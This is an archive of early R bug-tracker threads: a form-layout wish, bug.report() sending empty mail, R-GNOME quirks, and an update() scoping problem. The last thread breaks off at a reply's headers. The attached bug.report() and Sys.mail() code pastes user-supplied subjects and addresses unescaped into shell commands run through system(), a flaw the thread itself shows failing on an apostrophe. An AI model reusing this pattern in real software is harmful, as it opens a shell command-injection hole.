Date: Wed, 10 Oct 2001 18:24:29 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1126 <==
From jens.lund@nordea.com  Wed Oct 10 18:24:29 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA01798
	for <R-bugs@biostat.ku.dk>; Wed, 10 Oct 2001 18:24:29 +0200 (MET DST)
Date: Wed, 10 Oct 2001 18:24:29 +0200 (MET DST)
From: jens.lund@nordea.com
Message-Id: <200110101624.SAA01798@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: R-bug report www page whishlist

Full_Name: Jens Lund
Version: --
OS: --
Submission from: (NULL) (194.239.194.210)


On http://r-bugs.biostat.ku.dk/cgi-bin/R pressing "new bug report" returns a new
form. It would, IMHO, be natural to place the "submit bug report" button on this
form *below* the input area for the actual bug report :-)

Cheers, Jens

==> 1126.audit <==
Wed Oct 10 19:08:54 2001	ripley	moved from incoming to Misc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1158 *
Subject: bug.report()sends empty message
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
Date: Mon, 05 Nov 2001 10:05:27 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1158 <==
From pgilbert@bank-banque-canada.ca  Mon Nov  5 16:07:41 2001
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA03956
	for <r-bugs@biostat.ku.dk>; Mon, 5 Nov 2001 16:07:39 +0100 (MET)
Received: from fwx-t1 ([140.80.193.132])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id KAA05318;
	Mon, 5 Nov 2001 10:01:04 -0500 (EST)
Message-ID: <3BE6AAB6.E0962CD5@bank-banque-canada.ca>
Date: Mon, 05 Nov 2001 10:05:27 -0500
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.7 [en] (Win95; U)
X-Accept-Language: en
MIME-Version: 1.0
To: R-bugs <r-bugs@biostat.ku.dk>
CC: brahm@alum.mit.edu
Subject: bug.report()sends empty message
Content-Type: multipart/mixed;
 boundary="------------FAC78F7B6BFECAD9BD873458"

This is a multi-part message in MIME format.
--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

On Mon, 22 Oct 2001, David Brahm wrote:
>    I swear, bug.report() ate my message!  Apologies to all, esp. Peter
who
> will once again have to clean up after my mess...

With some editors on Unix bug.report() does this. The problem is that
some editors (like Nedit) fork a separate process and return. The Unix
version of bug.report sends an empty message in this case. The fix is to
make the Unix version the same as the Windows version, with an optional
argument "wait".

Attached are four small files bug.report.R, bug.report.Rd, Sys.mail.R,
and Sys.mail.Rd, which attempt to fix the problem and the documentation.
They also separate out the mail mechanism as a utility that can be used
elsewhere. Unfortunately, I have only been able to test these on a
limited number of platforms.

Paul Gilbert

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="bug.report.R"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="bug.report.R"

bug.report <- function(subject = "", ccaddress = Sys.getenv("USER"),
                       method = getOption("mailer"),
                       address = "gilp",  #"r-bugs@r-project.org",
                       file = "R.bug.report",
		       wait=TRUE)
{
    methods <- c("mailx", "gnudoit", "none", "ess")

    method <-
	if(is.null(method)) "none"
	else methods[pmatch(method, methods)]

    body <- paste("\\n<<insert bug report here>>\\n\\n\\n\\n",
		  "--please do not edit the information below--\\n\\n",
		  "Version:\\n ",
		  paste(names(R.version),R.version, sep=" = ",collapse="\\n "),
		  "\\n\\n",
		  "Search Path:\\n ",
		  paste(search(), collapse=", "),
		  "\\n", sep="", collapse="")

    if(method == "gnudoit") {
	cmd <- paste("gnudoit -q '",
		     "(mail nil \"", address, "\")",
		     "(insert \"", body, "\")",
		     "(search-backward \"Subject:\")",
		     "(end-of-line)'",
		     sep="")
	system(cmd)
        if (wait) {
	  cat("Hit Return to continue in R. ")
	  answer <- readline()
        }
    }
    else if(method=="none"){

        disclaimer <-
            paste("# Your mailer is set to \"none\" (default on Windows),\n",
                  "# hence we cannot send the bug report directly from R.\n",
                  "# Please copy the bug report (after finishing it) to\n",
                  "# your favorite email program and send it to\n#\n",
                  "#       ", address, "\n#\n",
                  "######################################################\n",
                  "\n\n", sep = "")

        cat(disclaimer, file=file)
	body <- gsub("\\\\n", "\n", body)
	cat(body, file=file, append=TRUE)
	system(paste(getOption("editor"), file))
        cat("The unsent bug report can be found in file", file, "\n")
        if (wait) {
	  cat("Hit Return to continue in R. ")
	  answer <- readline()
        }
    }
    else if(method == "mailx"){

        if(missing(subject)) stop("Subject missing")

	body <- gsub("\\\\n", "\n", body)
	cat(body, file=file, append=FALSE)
	system(paste(getOption("editor"), file))
	
	if (wait) {
	  cat("Submit the bug report? (finish editing and save the file before responding) ")
	  answer <- readline()
	  answer <- grep("y", answer, ignore.case=TRUE)
	  if(length(answer)>0){
 	     body <- scan(file, what="char", sep="\n")
             cat("Sending email ...\n")
             status <- Sys.mail(address=address, ccaddress=ccaddress,
	                       subject=subject, body=body, method="mailx")
             if(!status) status <- Sys.mail(address=address, ccaddress=ccaddress,
	                       subject=subject, body=body, method="mail")
             if(!status) status <- Sys.mail(address=address, ccaddress=ccaddress,
	                       subject=subject, body=body, method="Mail")
             if(!status) {
                cat("Sending email failed!\n")
                cat("The unsent bug report can be found in file", file, "\n")
            }
	  }
        }
        else cat("The unsent bug report can be found in file", file, "\n")
    }
    else if(method=="ess"){
	body <- gsub("\\\\n", "\n", body)
	cat(body)
        if (wait) {
	  cat("Hit Return to continue in R. ")
	  answer <- readline()
        }
    }
}

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="bug.report.Rd"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="bug.report.Rd"

\name{bug.report}
\alias{bug.report}
\title{Send a Bug Report}
\usage{
bug.report(subject = "", ccaddress = Sys.getenv("USER"),
           method = getOption("mailer"), 
	   address = "r-bugs@r-project.org",
           file = "R.bug.report",
	   wait = TRUE)

}
\arguments{
  \item{subject}{Subject of the email. Please do not use single quotes
    (\code{'}) in the subject!}
  \item{ccaddress}{Optional email address for copies (default is current
    user).  Use \code{ccaddress = NULL} for no copies.}
  \item{method}{Submission method, one of \code{"mailx"},
    \code{"gnuclient"}, \code{"none"}, or \code{"ess"}.}
  \item{address}{Recipient's email address.}
  \item{file}{File to use for setting up the email (or storing it when
    method is \code{"none"} or sending mail fails).}
  \item{wait}{logical. Should \R wait for the editor to return?}
}
\description{
  Invokes an editor to write a bug report and optionally mail it to the
  r-bugs list at \email{r-bugs@r-project.org}.  Some standard
  information on the current version and configuration of \R are 
  included automatically.
}
\details{
  Currently direct submission of bug reports works only on Unix systems.
  If the submission method is \code{"mailx"}, then the default editor is
  used to write the bug report. Which editor is used can be controlled
  using \code{\link{options}}, type \code{getOption("editor")} to see what
  editor is currently defined. Please use the help pages of the
  respective editor for details of usage. After saving the bug report
  (in the temporary file opened) and exiting the editor
  the report is mailed using a Unix command line mail utility such as
  \code{mailx}.  A copy of the mail is sent to the current user.

  If method is \code{"gnuclient"}, then an emacs mail buffer is opened
  and used for sending the email.

  If method is \code{"none"} or \code{NULL} (which is the default on
  Windows systems), then only an editor is opened to help writing the
  bug report.  The report can then be copied to your favorite email
  program and be sent to the r-bugs list.

  If method is \code{"ess"} the body of the mail is simply sent to
  stdout.
  
  If wait is \code{"TRUE"} then \R issues a prompt after the editor is started
  and waits for input. If \R is sending the mail (e.g. with method
  code{"mailx"}) then wait should be \code{"TRUE"}. In this case the edited file
  must be saved before responding to the question.
}
\value{Nothing useful.}
\section{When is there a bug?}{
  If \R executes an illegal instruction, or dies with an operating
  system error message that indicates a problem in the program (as
  opposed to something like ``disk full''), then it is certainly a bug.

  Taking forever to complete a command can be a bug, but you must make
  certain that it was really \R's fault.  Some commands simply take a
  long time.  If the input was such that you KNOW it should have been
  processed quickly, report a bug.  If you don't know whether the
  command should take a long time, find out by looking in the manual or
  by asking for assistance.

  If a command you are familiar with causes an \R error message in a
  case where its usual definition ought to be reasonable, it is probably
  a bug.  If a command does the wrong thing, that is a bug.  But be sure
  you know for certain what it ought to have done.  If you aren't
  familiar with the command, or don't know for certain how the command
  is supposed to work, then it might actually be working right.  Rather
  than jumping to conclusions, show the problem to someone who knows for
  certain.

   Finally, a command's intended definition may not be best for
   statistical analysis.  This is a very important sort of problem, but
   it is also a matter of judgment.  Also, it is easy to come to such a
   conclusion out of ignorance of some of the existing features.  It is
   probably best not to complain about such a problem until you have
   checked the documentation in the usual ways, feel confident that you
   understand it, and know for certain that what you want is not
   available.  If you are not sure what the command is supposed to do
   after a careful reading of the manual this indicates a bug in the
   manual.  The manual's job is to make everything clear.  It is just as
   important to report documentation bugs as program bugs.

   If the online argument list of a function disagrees with the manual,
   one of them must be wrong, so report the bug.
}
\section{How to report a bug}{
  When you decide that there is a bug, it is important to report it and
  to report it in a way which is useful.  What is most useful is an
  exact description of what commands you type, from when you start \R
  until the problem happens.  Always include the version of \R, machine,
  and operating system that you are using; type `version' in \R to print
  this. 

  The most important principle in reporting a bug is to report FACTS,
  not hypotheses or categorizations.  It is always easier to report the
  facts, but people seem to prefer to strain to posit explanations and
  report them instead.  If the explanations are based on guesses about
  how \R is implemented, they will be useless; we will have to try to 
  figure out what the facts must have been to lead to such
  speculations.  Sometimes this is impossible.  But in any case, it is
  unnecessary work for us.

  For example, suppose that on a data set which you know to be quite
  large the command \code{data.frame(x, y, z, monday, tuesday)} never
  returns.  Do not report that \code{data.frame()} fails for large data
  sets.  Perhaps it fails when a variable name is a day of the week.  If
  this is so then when we got your report we would try out the
  \code{data.frame()} command on a large data set, probably with no day
  of the week variable name, and not see any problem. There is no way in
  the world that we could guess that we should try a day of the week
  variable name.

  Or perhaps the command fails because the last command you used was a
  \code{[} method that had a bug causing \R's internal data structures
  to be corrupted and making the \code{data.frame()} command fail from
  then on.  This is why we need to know what other commands you have
  typed (or read from your startup file).

  It is very useful to try and find simple examples that produce
  apparently the same bug, and somewhat useful to find simple examples
  that might be expected to produce the bug but actually do not.  If you
  want to debug the problem and find exactly what caused it, that is
  wonderful.  You should still report the facts as well as any
  explanations or solutions.

  Invoking \R with the \code{--vanilla} option may help in isolating a
  bug.  This ensures that the site profile and saved data files are not
  read.

  On some systems a bug report can be generated using the
  \code{bug.report()} function.  This automatically includes the version
  information and sends the bug to the correct address.  Alternatively
  the bug report can be emailed to \email{r-bugs@r-project.org} or
  submitted to the Web page at \url{http://bugs.r-project.org}.
}
\seealso{R FAQ, \code{link{Sys.mail}} }
\author{This help page is adapted from the Emacs manual}
\keyword{utilities}
\keyword{error}

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="Sys.mail.R"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="Sys.mail.R"

Sys.mail <- function(address = Sys.info()$user,
                     ccaddress  = NULL,
                     bccaddress = NULL,
		     subject    = NULL,
		     body= "no body",
                     method = getOption("mailer")) {
   if(!(is.character(address) && nchar(address)>0))
      stop("A character string address must be specified.")

   # The arguments to mail, mailx, and Mail are all the same, but a different
   # mailer will require that this first part be re-organized under the
   # specific method.
   file <- tempfile()
   on.exit(unlink(file))
   cat(body, file=file, append=FALSE, sep="\n")
   cmdargs <- paste(address, "<", file, "2>/dev/null")
	
   if(is.character(ccaddress) && nchar(ccaddress)>0) 
            cmdargs <- paste(" -c '", ccaddress, "' ",  cmdargs)

   if(is.character(bccaddress) && nchar(bccaddress)>0) 
            cmdargs <- paste(" -b '", bccaddress, "' ",  cmdargs)

   if(is.character(subject) && nchar(subject)>0) 
            cmdargs <- paste(" -s '", subject, "' ",  cmdargs)

   status <- 1
   if(method == "mailx") status <- system(paste("mailx", cmdargs)) else
   if(method == "mail")  status <- system(paste("mail", cmdargs))  else 
   if(method == "Mail")  status <- system(paste("Mail", cmdargs))  else {
	warning(paste("mail method ", method, " not supported.\n"))
	return(F)
	}
   if(status > 0) {
	warning(paste("sending email with ", method, " failed.\n"))
	return(F)
	}
   T
   }

--------------FAC78F7B6BFECAD9BD873458
Content-Type: text/plain; charset=us-ascii;
 name="Sys.mail.Rd"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="Sys.mail.Rd"

\name{Sys.mail}
\alias{Sys.mail}
\title{Send Mail}
\usage{
Sys.mail(address= Sys.info()$user, ccaddress = NULL, bccaddress = NULL,
           subject = NULL, body= "no body", method = getOption("mailer"))
}
\arguments{
  \item{address}{Recipient's email address. The default is the user name as
     indicated by \code{Sys.info()$user}, which will correspond to your 
     own email address on many systems.}
  \item{ccaddress}{Optional email address for copies. 
    Use \code{ccaddress = NULL} for no copies.}
  \item{bccaddress}{Optional email address for blind copies.
    Use \code{bccaddress = NULL} for no copies.}
  \item{subject}{Subject of the email. Please do not use single quotes
     in the subject!}
  \item{method}{Submission method, one of \code{"mailx"},
    \code{"mail"}, or \code{"Mail"}.}
  \item{body}{A vector of character, one line per element to place in the body
     of the email.}
}
\description{
  Use a system mail tool to send a message. Multiple recipients can be
  specified in any of the addresses by enclosing them in double (\code{"}) 
  quotes. Please do not use single (\code{'}) quotes.
  
  The body is a vector of character. Each element of body is written 
  as a line of the message body.
}
\details{
  Currently works only on Unix systems using "mailx", "mail" or "Mail". The mail
  tool needs to be found on your Unix search path.
}
\value{TRUE or FALSE indicating success or failure as returned by the operating
    system. (This does not indicate that the message was received at the 
    address.)}

\examples{
    \dontrun{Sys.mail(address="friends", subject="R", body="R is great")}
}
\seealso{\code{link{options}} }
\author{Paul Gilbert}
\keyword{utilities}


--------------FAC78F7B6BFECAD9BD873458--


==> 1158.audit <==
Sat Nov 17 11:59:57 2001	ripley	foobar
Sat Nov 17 11:59:57 2001	ripley	moved from incoming to Misc

==> 1158.followup.1 <==
From postmaster@franz.stat.wisc.edu  Mon Dec 10 19:37:36 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA01758
	for <r-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 19:37:35 +0100 (MET)
Received: from mailmro2.fmr.com (really [192.223.198.254]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16DVIu-000IheC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Mon, 10 Dec 2001 12:37:28 -0600 (CST) 
Received: from virmro110nts.fmr.com (virmro110nts.fmr.com [172.26.5.98])
	by mailmro2.fmr.com (Switch-2.2.0/Switch-2.2.0) with SMTP id fBAIaqX07055
	for <r-bugs@r-project.org>; Mon, 10 Dec 2001 13:36:52 -0500 (EST)
Received: from arbprod.fmr.com (arbproda.fmr.com [155.1.103.75]) by msgbos102nts.fmr.com with SMTP (Microsoft Exchange Internet Mail Service Version 5.5.2654.89)
	id W0GPQMRB; Mon, 10 Dec 2001 13:36:51 -0500
Received: (from a215020@localhost)
	by arbprod.fmr.com (8.11.1/8.11.1) id fBAIapl09851;
	Mon, 10 Dec 2001 13:36:51 -0500 (EST)
Date: Mon, 10 Dec 2001 13:36:51 -0500 (EST)
From: David Brahm  <a215020@onyx.fmr.com>
Message-Id: <200112101836.fBAIapl09851@arbprod.fmr.com>
Reply-to: brahm@alum.mit.edu
To: r-bugs@r-project.org
Cc: a215020@arbprod.fmr.com
Subject:  Re: bug.report() sends empty message (PR#1158) 

   On Oct 22, I sent an empty bug report (#1138) because bug.report() "ate my
message".  Paul Gilbert opened a new bug report (#1158) for this problem.

   I'm now convinced it's because I had an apostrophe in the subject line
("round() doesn't").  The bug.report documentation specifically warns against
this, but the bug.report() function could also check for it!  I suggest adding
this line to the bug.report code:

  if (regexpr("'", subject) > 0) stop("Please, no apostrophe in the subject.")

                              -- David Brahm (brahm@alum.mit.edu)

R> getOption("mailer")
   [1] "mailx"
Version:
 platform = sparc-sun-solaris2.6
 arch = sparc
 os = solaris2.6
 system = sparc, solaris2.6
 status = 
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, package:misc, package:io, package:arrays, package:ls1, package:g.data, package:db, package:ts, package:ctest, Autoloads, package:base

==> 1158.followup.2 <==
From pgilbert@bank-banque-canada.ca  Mon Dec 10 20:09:31 2001
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA01969
	for <R-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 20:09:29 +0100 (MET)
Received: from fwx-int (fwx-int.bank-banque-canada.ca [140.80.193.129])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id OAA00487;
	Mon, 10 Dec 2001 14:04:01 -0500 (EST)
Received: from mfa99599.boc by mailhost.bank-banque-canada.ca (8.8.8+Sun/SMI-SVR4)
	id NAA05366; Mon, 10 Dec 2001 13:53:57 -0500 (EST)
Received: from mfa01506.boc (mfa01506 [140.80.3.112])
	by mfa99599.boc (8.9.1b+Sun/8.9.1) with ESMTP id NAA29819;
	Mon, 10 Dec 2001 13:53:56 -0500 (EST)
Received: from bank-banque-canada.ca (localhost [127.0.0.1])
	by mfa01506.boc (8.9.3+Sun/8.9.3) with ESMTP id NAA09467;
	Mon, 10 Dec 2001 13:53:53 -0500 (EST)
Sender: pgilbert@bank-banque-canada.ca
Message-ID: <3C1504C0.1ADC7F0D@bank-banque-canada.ca>
Date: Mon, 10 Dec 2001 13:53:52 -0500
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.75 [en] (X11; U; SunOS 5.8 sun4u)
X-Accept-Language: en
MIME-Version: 1.0
To: brahm@alum.mit.edu
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Re: bug.report() sends empty message (PR#1158)
References: <200112101837.TAA01768@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

brahm@alum.mit.edu wrote:
>   On Oct 22, I sent an empty bug report (#1138) because bug.report()
>"ate my
>message".  Paul Gilbert opened a new bug report (#1158) for this
>problem.

>   I'm now convinced it's because I had an apostrophe in the subject
>line

Your problem may have been due to the apostrophe, but it reminded me of another
outstanding problem which I had neglected to report previously: wait=TRUE as in
the windows version seems to be necessary with some Unix editors too (e.g.
Nedit).

Paul Gilbert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1503 *
Subject: R-GNOME
From: Patrick Gonin <gonin@genethon.fr>
Date: Thu, 2 May 2002 09:29:07 +0200
--1) is not a bug, as jpeg etc work.  capabilities() has been changed for 1.5.1
--2) system() needs a new version for GNOME.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1503 <==
From gonin@genethon.fr  Thu May  2 09:30:07 2002
Received: from diogene.genethon.fr (root@diogene.genethon.fr [193.50.68.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA00984
	for <r-bugs@biostat.ku.dk>; Thu, 2 May 2002 09:30:06 +0200 (MET DST)
Received: (from root@localhost)
	by diogene.genethon.fr (8.11.5/8.11.5) id g427TSs22721
	for r-bugs@biostat.ku.dk; Thu, 2 May 2002 09:29:28 +0200 (MET DST)
Received: from [192.168.100.154] (nat0-154.genethon.fr [192.168.100.154])
	by diogene.genethon.fr (8.11.5/8.11.5) with ESMTP id g427TOA22697
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 09:29:24 +0200 (MET DST)
Mime-Version: 1.0
X-Sender: gonin@diogene.genethon.fr
Message-Id: <a05100300b8f698c569f1@[192.168.100.154]>
Date: Thu, 2 May 2002 09:29:07 +0200
To: R-bugs@biostat.ku.dk
From: Patrick Gonin <gonin@genethon.fr>
Subject: R-GNOME
Content-Type: text/plain; charset="iso-8859-1" ; format="flowed"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id JAA00984

Hi R colleagues,

I don't know whether this is a bug, but something weird happen with R-GNOME.
Version 1.5.0.
I compiled the stuff under i-686 Linux RH 7.2 using ./configure --with-gnome.
R can be started with or without the Gnome interface: fine.
However, when I start with Gnome interface, jpeg and a few other 
things are unavailable (checked using capabilities()), whereas 
everything is available (except Gnome) when I start R without Gnome.
Also, some calls seem available with Gnome: system("..") returns nothing.
Maybe this is related to the experimental nature of the Gnome interface.
Hope that helps.
Cheers,
-- 
----------------------------
Patrick Gonin, DVM, PhD
Head of in vivo Evaluation Dept
Généthon
1 bis, rue de l'Internationale- BP 60
91002 EVRY CEDEX
FRANCE
Tel: 33-1-69-47-10-21
Fax: 33-1-60-77-86-98
gonin@genethon.fr
----------------------------

==> 1503.followup.1 <==
From ripley@stats.ox.ac.uk  Thu May  2 11:22:18 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA02921
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 11:22:18 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA23483;
	Thu, 2 May 2002 10:21:37 +0100 (BST)
Date: Thu, 2 May 2002 10:21:37 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <gonin@genethon.fr>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R-GNOME (PR#1503)
In-Reply-To: <200205020730.JAA00989@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0205021016060.3970-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=X-UNKNOWN
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from QUOTED-PRINTABLE to 8bit by pubhealth.ku.dk id LAA02921

On Thu, 2 May 2002 gonin@genethon.fr wrote:

> Hi R colleagues,
>
> I don't know whether this is a bug, but something weird happen with R-GNOME.
> Version 1.5.0.
> I compiled the stuff under i-686 Linux RH 7.2 using ./configure --with-gnome.
> R can be started with or without the Gnome interface: fine.
> However, when I start with Gnome interface, jpeg and a few other
> things are unavailable (checked using capabilities()), whereas
> everything is available (except Gnome) when I start R without Gnome.

Have you actually tried them?  capabilities() can be wrong, as it only
reports what it is sure about.  For me under RH7.2 jpeg(), png() and X11()
do all work under R --gui=gnome.  (Well, actually gnome has problems with
its dialogs as it makes assumptions about the X11 system in use and I am
not using XFree86.)

I will try to work out a more definitive algorithm for capabilities, but
its main use is to test if checks should be run, so it needs to be
conservative.  And as you note, Gnome is experimental and has a separate
maintainer ....

> Also, some calls seem available with Gnome: system("..") returns nothing.
> Maybe this is related to the experimental nature of the Gnome interface.
> Hope that helps.
> Cheers,
> --
> ----------------------------
> Patrick Gonin, DVM, PhD
> Head of in vivo Evaluation Dept
> Généthon
> 1 bis, rue de l'Internationale- BP 60
> 91002 EVRY CEDEX
> FRANCE
> Tel: 33-1-69-47-10-21
> Fax: 33-1-60-77-86-98
> gonin@genethon.fr
> ----------------------------
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1503.followup.2 <==
From plummer@iarc.fr  Thu May  2 12:32:14 2002
Received: from smtp01.iarc.fr (IDENT:root@smtp01-193.iarc.fr [193.51.164.211])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA04003
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 12:32:04 +0200 (MET DST)
Received: from xena.iarc.fr ([10.10.150.201])
	by smtp01.iarc.fr (8.9.3/8.9.3) with ESMTP id MAA17293;
	Thu, 2 May 2002 12:30:44 +0200
Message-ID: <XFMail.20020502123210.plummer@iarc.fr>
X-Mailer: XFMail 1.4.7 on Linux
X-Priority: 3 (Normal)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 8bit
MIME-Version: 1.0
In-Reply-To: <200205020922.LAA02927@pubhealth.ku.dk>
Date: Thu, 02 May 2002 12:32:10 +0200 (CEST)
Organization: International Agency for Research on Cancer
Sender: martyn@xena.iarc.fr
From: Martyn Plummer <plummer@iarc.fr>
To: ripley@stats.ox.ac.uk
Subject: Re: [Rd] R-GNOME (PR#1503)
Cc: R-bugs@biostat.ku.dk, r-devel@stat.math.ethz.ch

On 02-May-2002 ripley@stats.ox.ac.uk wrote:
> On Thu, 2 May 2002 gonin@genethon.fr wrote:
> 
>> Hi R colleagues,
>>
>> I don't know whether this is a bug, but something weird happen with R-GNOME.
>> Version 1.5.0.
>> I compiled the stuff under i-686 Linux RH 7.2 using ./configure
>> --with-gnome.
>> R can be started with or without the Gnome interface: fine.
>> However, when I start with Gnome interface, jpeg and a few other
>> things are unavailable (checked using capabilities()), whereas
>> everything is available (except Gnome) when I start R without Gnome.
> 
> Have you actually tried them?  capabilities() can be wrong, as it only
> reports what it is sure about.  For me under RH7.2 jpeg(), png() and X11()
> do all work under R --gui=gnome.  (Well, actually gnome has problems with
> its dialogs as it makes assumptions about the X11 system in use and I am
> not using XFree86.)
> 
> I will try to work out a more definitive algorithm for capabilities, but
> its main use is to test if checks should be run, so it needs to be
> conservative.  And as you note, Gnome is experimental and has a separate
> maintainer ....

jpeg() is available under the GNOME interface and works correctly.

>> Also, some calls seem available with Gnome: system("..") returns nothing.
>> Maybe this is related to the experimental nature of the Gnome interface.
>> Hope that helps.

The GNOME port currently uses the same version of do_system as the unix
command line port of R.  This sends the output of the system call to
the standard output.  So, for example, if you R-GNOME from a terminal,
the output will appear in the terminal and not the R GNOME console.
GNOME needs its own version of do_system.  I will fix this for R 1.5.1.

Martyn

==> 1503.audit <==
Tue May  7 09:09:09 2002	ripley	changed notes
Tue May  7 09:09:09 2002	ripley	foobar
Tue May  7 09:09:09 2002	ripley	moved from incoming to Misc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Models

* PR# 1861 *
Subject: update() can not find objects
From: yzhou@arcturusag.com
Date: Thu, 1 Aug 2002 19:01:59 +0200 (MET DST)
--The problem is actually deeper than this.
--
--Sometime update() wants to evaluate arguments in the environment where the model
--was defined, as here. 
--
--Sometimes it wants to use the current environment, eg this snippet from MASS 
--ph.fun <- function(data, i) {
--  d <- data
--  d$calls <- d$fitted + d$res[i]
--  coef(update(fit, data=d))
--}
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1861 <==
From yzhou@arcturusag.com  Thu Aug  1 19:02:00 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA28213
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 19:01:59 +0200 (MET DST)
Date: Thu, 1 Aug 2002 19:01:59 +0200 (MET DST)
From: yzhou@arcturusag.com
Message-Id: <200208011701.TAA28213@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: update() can not find objects

Full_Name: Yi-Xiong Zhou
Version: 1.5.1
OS: win2000pro
Submission from: (NULL) (64.169.249.42)


Update() can not find objects when it is used in a function, which is in turn
being called by another function. Here is a R script to show the problem:

######## begin of the test script ##########
fun1 <- function() {
   x <- matrix(rnorm(500), 20,25)
   y <- rnorm(20)
   oo <- lm(y~x)
   print("step 1")
   update(oo)
   print("first update success.")
   fun2(oo)
}

fun2 <- function(gg) {
   update(gg)
   print("second update success.")
}

fun1()
########### end of the test script #############

Here is the result of running this script:

[1] "step 1"
[1] "first update success."
Error in eval(expr, envir, enclos) : Object "y" not found

Ideally, update should first search the objects in its environment first, then
its parent's, and grand parent's environments ... Right now, it only searchs its
own environment and the global environment, skipping its parents'. 


==> 1861.reply.1 <==
From p.dalgaard@biostat.ku.dk  Thu Aug  1 19:26:45 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA28287;
	Thu, 1 Aug 2002 19:26:44 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g71HQaE08765;
	Thu, 1 Aug 2002 19:26:36 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: yzhou@arcturusag.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: update() can not find objects (PR#1861)
References: <200208011702.TAA28218@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 01 Aug 2002 19:26:34 +0200
In-Reply-To: <200208011702.TAA28218@pubhealth.ku.dk>
Message-ID: <x2ptx232yd.fsf@biostat.ku.dk>
Lines: 67
